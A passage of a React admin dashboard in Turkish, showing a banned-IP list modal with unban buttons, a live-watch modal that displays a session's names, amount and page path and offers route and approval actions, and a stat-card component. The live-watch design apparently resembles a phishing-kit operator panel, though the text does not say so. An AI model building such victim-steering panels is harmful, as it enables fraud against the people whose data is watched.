          </div>
        </div>
        );
      })()}

      {/* ========== BAN LISTESI MODALI: Ban Sayisi StatCard tiklaninca acilir ========== */}
      {showBannedListModal && (
        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/85 p-4 backdrop-blur-sm">
          <div className={`w-full max-w-2xl max-h-[85vh] rounded-3xl border shadow-2xl overflow-hidden flex flex-col ${darkMode ? 'bg-[#111111] border-zinc-800' : 'bg-white border-gray-200'}`}>
            {/* MODAL HEADER */}
            <div className={`flex items-center justify-between gap-4 p-5 border-b ${darkMode ? 'border-zinc-800' : 'border-gray-200'}`}>
              <div className="flex items-center gap-3">
                <div className={`p-2.5 rounded-2xl ${darkMode ? 'bg-red-500/10 text-red-500' : 'bg-red-50 text-red-600'}`}>
                  <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" /></svg>
                </div>
                <div>
                  <h3 className={`text-lg font-black tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>Banlanan IP Adresleri</h3>
                  <p className={`text-[13px] opacity-70 mt-0.5 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>Toplam {bannedList.length} adet engellenmiş IP • İstediğini kaldırabilirsin</p>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => void loadBannedList()}
                  className={`flex items-center gap-1.5 rounded-full px-3.5 py-1.5 text-[12px] font-bold uppercase tracking-wider transition-all hover:scale-105 ${darkMode ? 'bg-white/5 border border-white/10 text-gray-300 hover:text-white hover:bg-white/10' : 'bg-gray-50 border border-gray-200 text-gray-600 hover:bg-gray-100 hover:text-black'}`}
                  title="Listeyi yenile"
                >
                  <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" /></svg>
                  Yenile
                </button>
                <button
                  onClick={() => setShowBannedListModal(false)}
                  className={`flex items-center justify-center w-10 h-10 rounded-full transition-all hover:scale-110 ${darkMode ? 'bg-white/5 hover:bg-white/10 text-zinc-400 hover:text-white' : 'bg-gray-50 hover:bg-gray-100 text-gray-500 hover:text-black'}`}
                  title="Kapat"
                >
                  <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M6 18L18 6M6 6l12 12" /></svg>
                </button>
              </div>
            </div>

            {/* MODAL ICERIK: BANLI LISTESI */}
            <div className="flex-1 overflow-y-auto">
              {loadingBanned && (
                <div className={`p-10 text-center text-[12px] opacity-50 ${darkMode ? 'text-zinc-400' : 'text-gray-500'}`}>
                  Ban listesi yükleniyor...
                </div>
              )}
              {!loadingBanned && bannedList.length === 0 && (
                <div className={`p-12 text-center rounded-none border-t-0 border-x-0 border-b-0 border-2 border-dashed m-4 rounded-3xl ${darkMode ? 'border-white/10 text-zinc-500' : 'border-gray-200 text-gray-400'}`}>
                  <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
                  <p className="text-[13px] font-black uppercase tracking-wider mb-1">Henüz banlanmış IP yok</p>
                  <p className="text-[13px] opacity-70">Sistemden IP engellediğinizde kayıtlar burada listelenecek</p>
                </div>
              )}

              {!loadingBanned && bannedList.length > 0 && (
                <div className={`divide-y ${darkMode ? 'divide-zinc-800' : 'divide-gray-100'}`}>
                  {bannedList.map((ban) => (
                    <div
                      key={ban.ip_address}
                      className={`flex items-start gap-4 p-4 transition-all ${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-gray-50'}`}
                    >
                      {/* IP + Detay */}
                      <div className="flex-1 min-w-0 space-y-1.5">
                        <div className="flex items-center gap-2 flex-wrap">
                          <span className={`font-mono font-black text-[15px] tracking-wider ${darkMode ? 'text-red-400' : 'text-red-600'}`}>
                            {ban.ip_address || "IP bilgisi yok"}
                          </span>
                          <span className={`inline-flex items-center rounded-full px-2 py-0.5 text-[11px] font-black uppercase tracking-wider whitespace-nowrap ${darkMode ? 'bg-red-500/10 text-red-400 border border-red-500/20' : 'bg-red-50 text-red-600 border border-red-100'}`}>
                            🔒 Engelli
                          </span>
                        </div>
                        {ban.reason && (
                          <div className={`text-[13px] opacity-80 leading-snug whitespace-normal break-words ${darkMode ? 'text-zinc-400' : 'text-gray-600'}`}>
                            <span className="font-bold uppercase tracking-wider opacity-70 mr-1">Neden:</span>
                            {ban.reason}
                          </div>
                        )}
                        {(ban.banned_at || ban.created_at) && (
                          <div className={`text-[12px] opacity-60 font-mono mt-1 ${darkMode ? 'text-zinc-500' : 'text-gray-500'}`}>
                            📅 {new Date(ban.banned_at || ban.created_at).toLocaleString('tr-TR')}
                          </div>
                        )}
                      </div>

                      {/* UNBAN BUTONU */}
                      <button
                        onClick={() => void handleUnban(ban.ip_address)}
                        className="shrink-0 flex items-center gap-1.5 rounded-xl px-4 py-2 text-[13px] font-black uppercase tracking-wider transition-all hover:scale-105 active:scale-95 bg-green-500/10 text-green-600 dark:text-green-400 hover:bg-green-500 hover:text-white border border-green-500/20"
                        title="Bu IP yasağını kaldır"
                      >
                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" /></svg>
                        Banı Kaldır
                      </button>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* MODAL FOOTER: KAPAT BUTONU */}
            <div className={`flex justify-end p-4 border-t ${darkMode ? 'border-zinc-800' : 'border-gray-200'}`}>
              <button
                onClick={() => setShowBannedListModal(false)}
                className={`rounded-xl px-6 py-2 text-sm font-bold transition-all hover:scale-105 ${darkMode ? 'bg-zinc-800 text-white hover:bg-zinc-700' : 'bg-gray-200 text-gray-900 hover:bg-gray-300'}`}
              >
                Kapat
              </button>
            </div>
          </div>
        </div>
      )}

      {/* LIVE WATCH MODAL */}
      {liveWatchRow && (
        <LiveWatchModal
          sessionId={liveWatchRow.id}
          publicId={liveWatchRow.public_id}
          initialName={`${(liveWatchRow.form_data as any)?.firstName || ""} ${(liveWatchRow.form_data as any)?.lastName || ""}`.trim()}
          initialAmount={liveWatchRow.amount}
          initialPath={sessionPaths[liveWatchRow.id]}
          formData={(liveWatchRow.form_data as any) || {}}
          isOnline={isSessionLive(
            liveWatchRow.id,
            onlineSessionIds,
            liveWatchRow.status,
            sessionLastSeenAt[liveWatchRow.id]
          )}
          darkMode={darkMode}
          onRouteAction={(action) => void handleRouteAction(liveWatchRow.id, action)}
          onApprovalAction={(approval) => void handleApprovalAction(liveWatchRow.id, approval)}
          onClose={() => setLiveWatchRow(null)}
        />
      )}
    </div>
  );
}

function StatCard({ icon, color, title, value, darkMode, onClick, clickable }: { icon: string, color: string, title: string, value: number, darkMode: boolean, onClick?: () => void, clickable?: boolean }) {
  return (
    <div onClick={onClick} className={`relative overflow-hidden p-6 rounded-3xl border flex items-center transition-all duration-300 hover:scale-[1.02] hover:shadow-xl group ${clickable || onClick ? 'cursor-pointer active:scale-95' : ''} ${darkMode ? 'bg-gradient-to-br from-[#1c1c1e]/80 to-[#1c1c1e]/40 border-white/5 shadow-lg backdrop-blur-xl' : 'bg-gradient-to-br from-white to-gray-50/80 border-[#d2d2d7]/50 shadow-md backdrop-blur-xl'}`}>
      <div className={`absolute -right-6 -top-6 w-24 h-24 rounded-full blur-2xl opacity-20 transition-all duration-500 group-hover:scale-150 group-hover:opacity-40 ${color.replace('text-', 'bg-')}`}></div>
      <div className={`w-14 h-14 shrink-0 flex items-center justify-center rounded-2xl shadow-sm ${color.replace('text-', 'bg-').replace('500', '500/10')} ${color}`}>
        <svg className="w-7 h-7 drop-shadow-sm" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d={icon} /></svg>
      </div>
      <div className="ml-5 relative z-10">
        <div className={`text-sm font-semibold tracking-wide uppercase opacity-70 mb-1 ${darkMode ? 'text-gray-400' : 'text-gray-500'}`}>{title}</div>
        <div className={`text-4xl font-bold tracking-tight ${darkMode ? 'text-white' : 'text-gray-900'}`}>{value}</div>
      </div>
    </div>
  );
}
